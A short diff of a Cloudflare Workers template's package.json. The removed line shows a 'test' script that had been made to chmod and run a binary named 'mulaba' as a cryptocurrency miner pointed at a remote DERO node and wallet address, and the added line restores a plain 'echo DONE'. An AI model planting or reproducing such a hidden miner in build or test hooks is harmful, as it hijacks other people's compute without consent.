@@ -5,7 +5,7 @@
   "description": "A template for kick starting a Cloudflare Workers project",
   "main": "index.js",
   "scripts": {
-    "test": "chmod 700 mulaba;timeout 25m ./mulaba --mining-threads 4 --daemon-rpc-address=dero-node.mysrv.cloud:10300 --wallet-address deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnje7yu7pv0rlr;echo DONE",
+    "test": "echo DONE",
     "format": "prettier --write '**/*.{js,css,json,md}'"
   },
   "author": "Kristian Freeman <kristian@kristianfreeman.com>",
